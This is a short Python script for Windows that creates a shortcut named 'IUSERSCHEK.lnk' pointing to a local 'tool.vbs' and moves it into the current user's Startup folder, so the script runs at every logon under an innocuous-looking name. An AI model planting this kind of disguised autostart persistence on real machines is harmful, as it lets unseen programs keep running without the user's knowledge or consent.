import os
from win32com.client import Dispatch
import getpass

USER_NAME = getpass.getuser()
wd = os.getcwd()
sd = '\"C:/Users/' + USER_NAME + '/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/\"'
shell = Dispatch('WScript.Shell')
shortcut = shell.CreateShortCut('IUSERSCHEK.lnk')
shortcut.Targetpath = wd + '/tool.vbs'
shortcut.WorkingDirectory = wd
shortcut.save()

os.system('move IUSERSCHEK.lnk '+ sd)